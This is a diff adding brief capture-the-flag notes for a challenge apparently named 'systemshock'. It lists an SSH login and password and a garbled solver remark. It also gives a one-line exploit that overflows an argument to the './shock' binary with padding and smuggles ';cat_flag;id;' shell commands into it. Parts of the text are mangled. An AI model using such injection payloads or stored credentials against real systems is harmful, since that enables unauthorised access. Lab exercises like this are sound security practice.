@@ -1,0 +1,15 @@
+ ? description
+==========================================
+Login : ssh systemshock@54.65.236.17
+Password : systemshocked
+==========================================
+
+ ? number of solvers : 0
+ ? breakthrough by
+
+ch? có ý t??ng gì :(
+
+B9sdeage OVvn23oSx0ds9^^to NVxqjy is_extremely Hosx093t
+
+./shock $(python -c "command = ';cat_flag;id;id;';b='a'*(0x205+8-len(command))+command;print b")
+
